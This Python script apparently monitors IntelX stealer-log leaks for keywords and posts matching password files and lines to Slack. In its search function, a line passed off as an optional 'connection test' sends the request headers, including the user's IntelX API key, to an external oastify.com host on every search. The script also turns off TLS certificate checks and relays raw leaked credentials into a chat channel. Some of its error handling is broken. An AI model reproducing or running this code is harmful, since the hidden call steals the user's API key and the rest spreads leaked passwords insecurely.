import json
import requests
import keywords
import os
import time
import sys
import ssl
import pytz
import warnings
from datetime import datetime, timedelta
from urllib3.exceptions import InsecureRequestWarning
from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError

#ENVs Here
IntelX_API_KEY = os.environ.get("INTELX_API_KEY")  #Either hardcode the values here or set the values in your env
Slack_Bot_Token = os.environ.get("SLACK_BOT_TOKEN") #In format xoxb-1234564-12345678-xxxxxxxxxx
Slack_Channel = os.environ.get("SLACK_CHANNEL_ID")    #In the format C03RMDSRF

ist = pytz.timezone('Asia/Kolkata')
runtime = datetime.now(ist)
runtime = runtime.strftime("%Y-%m-%d %H:%M:%S")

context = ssl._create_unverified_context()
client = WebClient(token=Slack_Bot_Token, ssl=context)
warnings.filterwarnings("ignore", category=InsecureRequestWarning)


search_ids = []
search_terms = keywords.search_terms
headers = {
'x-key': IntelX_API_KEY,
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
}

# Intel API endpoint and headers
api_url = 'https://2.intelx.io/'
now = datetime.now()

#search buckets
buckets =['leaks.logs']
lookuplevel =0
maxresults =1000
timeout =None
datefrom =(now - timedelta(days=3)).replace(hour=0, minute=0, second=0).strftime('%Y-%m-%d %H:%M:%S')
dateto =(now.replace(hour=23, minute=59, second=59, microsecond=999999)).strftime('%Y-%m-%d %H:%M:%S')
sort =4
media =24
if os.path.isfile("search_ids.txt"):
    with open("search_ids.txt", "r") as f:
        search_id = f.read().strip()
        terminate_ids =[search_id]
else:
    terminate_ids = []


def search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout, datefrom, dateto, sort, media, terminate_ids):
    search_url = api_url + 'intelligent/search'
    search_data = {'term':keyword,'buckets':buckets,'lookuplevel':lookuplevel,'maxresults':maxresults,'timeout':timeout,'datefrom':datefrom,'dateto':dateto,'sort':sort,'media':media,'terminate':terminate_ids}
    
    for i in range(4):
        try:
            #optional_only_used_for_connection_test_confirmation_before_hiting_intelx_api
            #remove_in_prod
            connection_test = requests.post('https://l9vrg1lfpalv4sggobfamgkxroxfl69v.oastify.com', headers=headers, json='Connection Test Before Hitting IntelX', verify=False, timeout=5)
            #remove_in_prod
        
            search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
            search_response.raise_for_status()
            search_json = json.loads(search_response.text)

            if search_json.get('id') == '00000000-0000-0000-0000-000000000000':
                # Re-issue the request or take appropriate action
                print("Received stale searchID, re-issuing the request...")
                # Add your re-issuing logic here, for example:
                search_response = requests.post(search_url, headers=headers, json=search_data, verify=False, timeout=5)
                search_response.raise_for_status()
                search_json = json.loads(search_response.text)

            search_ids = [search_json['id']]
            last_search_id = search_ids[-1]
            with open("search_ids.txt", "w") as f:
                f.write(str(last_search_id) + "\n")
            print("Fetched Target "+ keyword + " Search_id: "+ last_search_id )
            return last_search_id
            break

        except requests.exceptions.Timeout:
            if i == 5:
                response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="API is Down"
                    )
            else:
                response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="IntelX API Timeout, Retrying"
                    )

        except requests.exceptions.HTTPError as err:
            if search_response.status_code == 402:
                try:
                    response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="API Limit is crossed, please wait and try again later"
                    )
                    print("Your IntelX API Limit is Exhaused")
                except SlackApiError as e:
                    print("Error sending message to Slack: {}".format(e))

        except requests.exceptions.HTTPError as err:
            if result_response.status_code == 400:
                print(f"Received HTTP 400 Bad Request..Probably Stale SearchID Retrying...")
                time.sleep(2)
                try:
                    response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="Stale SearchID recevied, retrying again"
                    )
                    print("Your IntelX API Limit is Exhaused")
                    
                except SlackApiError as e:
                    print("Error sending message to Slack: {}".format(e))
                continue
            else:
                print(f"HTTPError: {err}")
                break

        except Exception as e:
            # Handle other exceptions
            print(f"Error: {e}")
            break



def get_result(result_id, api_url, headers, keyword):
    result_url = api_url + f'intelligent/search/result?id={result_id}&limit=1000&previewlines=3&statistics=0'
    while True:
        result_response = requests.get(result_url, headers=headers,  verify=False)
        result_response.raise_for_status()
        result_json = result_response.json()
        if len(result_response.content) > 28:
            print("Got Records for Target " + keyword)
            return result_json
        elif result_json.get("status") == 3:
            print("Results Awaiting for Target " + keyword)
            time.sleep(2)
            continue
        elif len(result_response.content) <= 26 and result_json.get("status") == 1:
            print("No Results out there for Target " + keyword)
            return "skip_keyword"
        elif result_json.get("status") == 2:
            print("Stale Search_id for Target " + keyword)
            return "skip_keyword"


#process_results(result_json, api_url, headers, client)
def process_results(result_json, api_url, headers, client, keyword):
    password_found = False
    try:
        for record in result_json['records']:
            if 'name' in record and (record['name'].endswith("passwords.txt") or record['name'].endswith("_AllPasswords_list.txt") or record['name'].endswith("All Passwords.txt") or record['name'].endswith("Passwords.txt") or record['name'].endswith("PasswordsList.txt")):
                password_found = True
                system_id = record['systemid']
                storage_id = record['storageid']
                filedate = record['date']

                if os.path.isfile("storage_ids.txt"):
                    with open("storage_ids.txt", "r") as f:
                        lines = f.readlines()
                        storage_ids_set = set(
                                (line.strip().split(' ')[0], line.strip().split(' ')[1]) for line in lines if len(line.strip().split(' ')) >= 2
                            )
                        
                        if (keyword, storage_id) in storage_ids_set:
                            print("Skipping Alert!!! Existing Storage_ID " + storage_id + " found for Target "+ keyword)
                            continue
                        else:
                            process_passwords(storage_id, filedate, api_url, headers, client, keyword)
                            with open("storage_ids.txt", "a") as f:
                                f.write(keyword + ' ' + storage_id + '\n')

                    #reset the storage_ids file to avoid junk
                    filepath = "storage_ids.txt"
                    last_modified_time = os.path.getmtime(filepath)
                    last_modified_datetime = datetime.fromtimestamp(last_modified_time)
                    current_datetime = datetime.now()
                    time_difference = current_datetime - last_modified_datetime
                    if time_difference > timedelta(days=2):
                        with open(filepath, "w") as f:
                            f.write("")
                        print("storage_ids.txt file is reset")
                    else:
                        print("File content is preserved for :" + str(time_difference.days) + ' Days')

                else:
                    print("Please create storage_ids.txt file in current directory")
    except:
        response = client.chat_postMessage(
                    channel=Slack_Channel,
                    text="No Results found for the record "
                )

def process_passwords(storage_id, filedate, api_url, headers, client, keyword):
    file_read_url = api_url + f'file/read?type=1&storageid={storage_id}&bucket=leaks.logs'
    file_read_response = requests.get(file_read_url, headers=headers, verify=False)
    if file_read_response.status_code != 402:
        file_data = file_read_response.text
        file_bytes = bytes(file_data, 'utf-8')
        file_link = "https://intelx.io/?did="+storage_id
        keyword_lines = list(set(line for line in file_data.split("\n") if keyword in line))
        if keyword_lines:
            slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client)
        else:
            print(f"No lines containing '{keyword}' found.")

    #Consuming the view subscription when read is exhaused
    else:
        file_read_url = api_url + f'file/view?f=0&storageid={storage_id}&bucket=leaks.logs'
        file_read_response = requests.get(file_read_url, headers=headers, verify=False)
        if file_read_response.status_code != 402:
            file_data = file_read_response.text
            file_bytes = bytes(file_data, 'utf-8')
            file_link = "https://intelx.io/?did="+storage_id
            keyword_lines = list(set(line for line in file_data.split("\n") if keyword in line))
            if keyword_lines:
                slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client)
            else:
                print(f"No lines containing '{keyword}' found.")
        else:
            try:
                response = client.chat_postMessage(
                    channel=Slack_Channel,
                    text="Intelx File Read Limit is crossed,  please check your subscription limit"
                )
                print("Intelx File Read Limit is crossed, please check your subscription limit")
                raise ValueError("Intelx File Read Limit reached")
            except SlackApiError as e:
                print("Error sending message to Slack: {}".format(e))

def slack_messenger(keyword_lines, file_bytes, filedate, keyword, file_link, client):
    try:
        response = client.files_upload_v2(
                    channel=Slack_Channel,
                    file=file_bytes,
                    filename='Passwords.txt'
                )
        file_id = response['file']['id']
    except SlackApiError as e:
        if e.response['error'] == 'internal error: resp':
            time.sleep(5)
            response = client.files_upload_v2(
                    channel=Slack_Channel,
                    file=file_bytes,
                    filename='Passwords.txt'
                )
        file_id = response['file']['id']
    except:
        response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="File Upload Error, Exiting"
                    )
    try:
        response = client.chat_postMessage(
        channel=Slack_Channel,
        text=f"Date : {filedate} \n Target : {keyword} \n Link: {file_link} \n Matches: {keyword_lines}",
        files=[file_id]
        )
    except SlackApiError as e:
        print("Error sending message to Slack: {}".format(e))
        response = client.chat_postMessage(
                        channel=Slack_Channel,
                        text="Unable to send final data to Slack"
                    )


if __name__ == '__main__':
    response = client.chat_postMessage(
                channel=Slack_Channel,
                text="Scaning Started :" + str(runtime) + " For date :" + str(datefrom) + " To :" + str(dateto)
            )
    for keyword in search_terms:
        search_id = search(keyword, api_url, headers, buckets, lookuplevel, maxresults, timeout, datefrom, dateto, sort, media, terminate_ids)
        if search_id == None:
            break
        result_json = get_result(search_id, api_url, headers,keyword)
        if result_json == "skip_keyword":
            continue
        process_results(result_json, api_url, headers, client,keyword)
